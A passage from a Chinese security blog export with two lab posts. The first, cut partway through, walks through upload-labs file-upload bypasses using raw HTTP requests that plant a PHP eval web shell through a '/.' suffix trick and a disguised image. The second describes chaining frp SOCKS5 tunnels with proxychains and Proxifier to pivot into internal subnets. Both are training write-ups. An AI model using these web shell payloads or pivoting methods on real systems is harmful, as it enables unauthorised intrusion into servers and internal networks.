class="variable">$myfile</span>, base64_decode(<span class="variable">$a</span>));</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">-----------------------------360549146619018030902827876042</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------360549146619018030902827876042--</span><br><span class="line">§ §</span><br></pre></td></tr></table></figure>

<p>不断去访问文件上传的目录下访问1.php</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET /upload/1.php HTTP/1.1</span><br><span class="line">Host: 43.139.33.242:50147</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1691048630892-16.png" alt="img"></p>
<h1 id="绕过"><a href="#绕过" class="headerlink" title="&#x2F;.绕过"></a>&#x2F;.绕过</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /Pass-19/index.php HTTP/1.1</span><br><span class="line">Host: 43.139.33.242:50147</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------83066911228284829962121425619</span><br><span class="line">Content-Length: 516</span><br><span class="line">Origin: http://43.139.33.242:50147</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://43.139.33.242:50147/Pass-19/index.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------83066911228284829962121425619</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;lang.php&quot;</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_REQUEST</span>[qwq]); ?&gt;</span><br><span class="line">-----------------------------83066911228284829962121425619</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;save_name&quot;</span></span><br><span class="line"></span><br><span class="line">upload-19.php/.</span><br><span class="line">-----------------------------83066911228284829962121425619</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">-----------------------------83066911228284829962121425619--</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1691048630892-17.png" alt="img"></p>
<h1 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /Pass-20/index.php?action=show_code HTTP/1.1</span><br><span class="line">Host: 43.139.33.242:50147</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------18336187236551915901059795467</span><br><span class="line">Content-Length: 3012</span><br><span class="line">Origin: http://43.139.33.242:50147</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://43.139.33.242:50147/Pass-20/index.php?action=show_code</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------18336187236551915901059795467</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.jpg&quot;</span></span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">ÿØÿá</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>frp多层内网隧道搭建proxychains及proxyfier多层代理详细设置</title>
    <url>/2023/07/25/frp%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BAproxychains%E5%8F%8Aproxyfier%E5%A4%9A%E5%B1%82%E4%BB%A3%E7%90%86%E8%AF%A6%E7%BB%86%E8%AE%BE%E7%BD%AE/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h1 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h1><p><img src="/2023/07/25/frp%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BAproxychains%E5%8F%8Aproxyfier%E5%A4%9A%E5%B1%82%E4%BB%A3%E7%90%86%E8%AF%A6%E7%BB%86%E8%AE%BE%E7%BD%AE/65982ea266a74a529dd2d1c632b3d97e.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali    192.168.112.128</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PC1    nat 192.168.112.152       vm1网卡 192.168.52.20</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PC2    vm1网卡 192.168.52.30      vm2网卡 192.168.54.40</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PC3    vm2网卡  192.168.54.50     vm3网卡 192.168.93.60</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PC4    VM3网卡   192.168.93.70</span><br></pre></td></tr></table></figure>



<h1 id="第一层隧道"><a href="#第一层隧道" class="headerlink" title="第一层隧道"></a>第一层隧道</h1><h2 id="kali-启动-frps"><a href="#kali-启动-frps" class="headerlink" title="kali 启动 frps"></a>kali 启动 frps</h2><p>配置文件如下</p>
<p>frps.ini</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure>

<p>启动命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">frps -c frps.ini</span><br></pre></td></tr></table></figure>

<p>Windows 后台运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start /b frps -c frps.ini</span><br></pre></td></tr></table></figure>

<p>这样即使CTRL +C也不会断开</p>
<p>Linux 后台运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nohup ./frps -c ./frps.ini &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>

<p>停止：</p>
<p>先找到pid进程</p>
<ul>
<li>ps -aux|grep <a href="https://so.csdn.net/so/search?q=frp&spm=1001.2101.3001.7020">frp</a>| grep -v grep</li>
</ul>
<p>例如找到进程为 6666</p>
<ul>
<li>kill -9 6666</li>
</ul>
<h2 id="PC1-启动-frpc"><a href="#PC1-启动-frpc" class="headerlink" title="PC1 启动 frpc"></a>PC1 启动 frpc</h2><p>frpc.ini</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">server_addr = 192.168.112.128</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[http_proxy]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">type = tcp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">remote_port = 7777</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plugin = socks5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local_ip = 192.168.52.20</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local_port = 7777</span><br></pre></td></tr></table></figure>

<p>启动命令</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">frpc <span class="operator">-</span><span class="built_in">c</span> frpc.ini</span><br></pre></td></tr></table></figure>



<h2 id="修改-etc-proxychains4-conf"><a href="#修改-etc-proxychains4-conf" class="headerlink" title="修改 etc&#x2F;proxychains4.conf"></a>修改 etc&#x2F;proxychains4.conf</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>







<p><img src="/2023/07/25/frp%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BAproxychains%E5%8F%8Aproxyfier%E5%A4%9A%E5%B1%82%E4%BB%A3%E7%90%86%E8%AF%A6%E7%BB%86%E8%AE%BE%E7%BD%AE/96bc2f5ee6e7401b8fd7dc9b7bd12926.png" alt="img"></p>
<p>proxyfier如图所示</p>
<p> <img src="/2023/07/25/frp%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BAproxychains%E5%8F%8Aproxyfier%E5%A4%9A%E5%B1%82%E4%BB%A3%E7%90%86%E8%AF%A6%E7%BB%86%E8%AE%BE%E7%BD%AE/042173f4358c471685c62327a7811a71.png" alt="img"></p>
<p>此时我们可以访问192.168.52.0这个网段</p>
<p><img src="/2023/07/25/frp%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BAproxychains%E5%8F%8Aproxyfier%E5%A4%9A%E5%B1%82%E4%BB%A3%E7%90%86%E8%AF%A6%E7%BB%86%E8%AE%BE%E7%BD%AE/5673335a19e144e09bac31a2e6ee16c8.png" alt="img"></p>
<p>我们想访问192.168.54.0此时需要搭建第二层隧道</p>
<h1 id="第二层隧道"><a href="#第二层隧道" class="headerlink" title="第二层隧道"></a>第二层隧道</h1><p>此时PC1既是客户端又是服务端</p>
<p>我们在PC1增加一个服务端</p>
<h2 id="PC1启动frps"><a href="#PC1启动frps" class="headerlink" title="PC1启动frps"></a>PC1启动frps</h2><p>frps.ini</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bind_addr = 192.168.52.20</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure>



<h2 id="PC2启动frpc"><a href="#PC2启动frpc" class="headerlink" title="PC2启动frpc"></a>PC2启动frpc</h2><p>frpc.ini</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">server_addr = 192.168.52.20</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[http_proxy]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">type = tcp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">remote_port = 7777</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plugin = socks5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local_ip = 192.168.54.40</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local_port = 7777</span><br></pre></td></tr></table></figure>

<p>在 etc&#x2F;proxychains4.conf 新增第二层代理</p>
<p><img src="/2023/07/25/frp%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BAproxychains%E5%8F%8Aproxyfier%E5%A4%9A%E5%B1%82%E4%BB%A3%E7%90%86%E8%AF%A6%E7%BB%86%E8%AE%BE%E7%BD%AE/814531c5ed6543d4a093c10484772dd0.png" alt="img"></p>
<p>此时我们可以访问192.168.54.0这个网段了</p>
<p> <img src="/2023/07/25/frp%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BAproxychains%E5%8F%8Aproxyfier%E5%A4%9A%E5%B1%82%E4%BB%A3%E7%90%86%E8%AF%A6%E7%BB%86%E8%AE%BE%E7%BD%AE/11b921d15a814fe0a101552325a75088.png" alt="img"></p>
<h2 id="多层代理下Proxifier如何设置？"><a href="#多层代理下Proxifier如何设置？" class="headerlink" title="多层代理下Proxifier如何设置？"></a>多层代理下<a href="https://so.csdn.net/so/search?q=Proxifier&spm=1001.2101.3001.7020">Proxifier</a>如何设置？</h2><p>再增加一个代理，这里是设置的第二层代理</p>
<p>点击Proxychains 右边create将代理链按顺序从proxy servers里按住依次拖下，我这里起的名字代理链，都要拖在你起的这个名字（我这里是代理链）里，注意在同一级，如图所示</p>
<p><img src="/2023/07/25/frp%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BAproxychains%E5%8F%8Aproxyfier%E5%A4%9A%E5%B1%82%E4%BB%A3%E7%90%86%E8%AF%A6%E7%BB%86%E8%AE%BE%E7%BD%AE/b7841db8456548778b391d6a69cd3a4c.png" alt="img"></p>
<p> <img src="/2023/07/25/frp%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BAproxychains%E5%8F%8Aproxyfier%E5%A4%9A%E5%B1%82%E4%BB%A3%E7%90%86%E8%AF%A6%E7%BB%86%E8%AE%BE%E7%BD%AE/5a376d87c2d14d138cc5cb04e73736c7.png" alt="img"></p>
<p>点击左下角add</p>
<p><img src="/2023/07/25/frp%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BAproxychains%E5%8F%8Aproxyfier%E5%A4%9A%E5%B1%82%E4%BB%A3%E7%90%86%E8%AF%A6%E7%BB%86%E8%AE%BE%E7%BD%AE/7c41d9efaf674ddb931d914c60f95ef5.png" alt="img"></p>
<p>配置如下 添加通向网段</p>
<p><img src="/2023/07/25/frp%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BAproxychains%E5%8F%8Aproxyfier%E5%A4%9A%E5%B1%82%E4%BB%A3%E7%90%86%E8%AF%A6%E7%BB%86%E8%AE%BE%E7%BD%AE/0f536eb78b714e52b845a6251041d159.png" alt="img"></p>
<p> 成功访问54网段</p>
<h1 id><a href="#" class="headerlink" title></a><img src="/2023/07/25/frp%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BAproxychains%E5%8F%8Aproxyfier%E5%A4%9A%E5%B1%82%E4%BB%A3%E7%90%86%E8%AF%A6%E7%BB%86%E8%AE%BE%E7%BD%AE/fb264c3136a44d38ad4f016c00753306.png" alt="img"></h1><h1 id="第三层隧道"><a href="#第三层隧道" class="headerlink" title="第三层隧道"></a>第三层隧道</h1><h2 id="PC2-启动frps"><a href="#PC2-启动frps" class="headerlink" title="PC2 启动frps"></a>PC2 启动frps</h2><p>原先PC2的frpc.ini无需变动</p>
<p>frps.ini</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bind_addr = 192.168.54.40</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure>



<h2 id="pc3启动frpc"><a href="#pc3启动frpc" class="headerlink" title="pc3启动frpc"></a>pc3启动frpc</h2><p>frpc.ini</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">server_addr = 192.168.54.40</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[http_proxy]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">type = tcp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">remote_port = 7777</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plugin = socks5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local_ip = 192.168.93.60</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local_port = 7777</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<h3 id="-1"><a href="#-1" class="headerlink" title></a><img src="/2023/07/25/frp%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BAproxychains%E5%8F%8Aproxyfier%E5%A4%9A%E5%B1%82%E4%BB%A3%E7%90%86%E8%AF%A6%E7%BB%86%E8%AE%BE%E7%BD%AE/e489a6dd7dc84852bc1ad467585a1f51.png" alt="img"></h3><p><img src="/2023/07/25/frp%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BAproxychains%E5%8F%8Aproxyfier%E5%A4%9A%E5%B1%82%E4%BB%A3%E7%90%86%E8%AF%A6%E7%BB%86%E8%AE%BE%E7%BD%AE/c5093b589235405a896cc2a1b4351265.png" alt="img"></p>
<p><img src="/2023/07/25/frp%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BAproxychains%E5%8F%8Aproxyfier%E5%A4%9A%E5%B1%82%E4%BB%A3%E7%90%86%E8%AF%A6%E7%BB%86%E8%AE%BE%E7%BD%AE/23b54e42b8754e76b6c3efd1b6228088.png" alt="img"></p>
<p><img src="/2023/07/25/frp%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BAproxychains%E5%8F%8Aproxyfier%E5%A4%9A%E5%B1%82%E4%BB%A3%E7%90%86%E8%AF%A6%E7%BB%86%E8%AE%BE%E7%BD%AE/81e7c59bd18a4c61a14db3ab96ded775.png" alt="img"></p>
<p>可以访问93这个网段了</p>
<p>访问下PC4</p>
<p><img src="/2023/07/25/frp%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BAproxychains%E5%8F%8Aproxyfier%E5%A4%9A%E5%B1%82%E4%BB%A3%E7%90%86%E8%AF%A6%E7%BB%86%E8%AE%BE%E7%BD%AE/17f49b7410324f6ca83e619671b6f3ec.png" alt="img"></p>
<p>按照这种方式不断搭建隧道，无论多少层我们都能访问</p>
]]></content>
      <tags>
        <tag>web</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
</search>
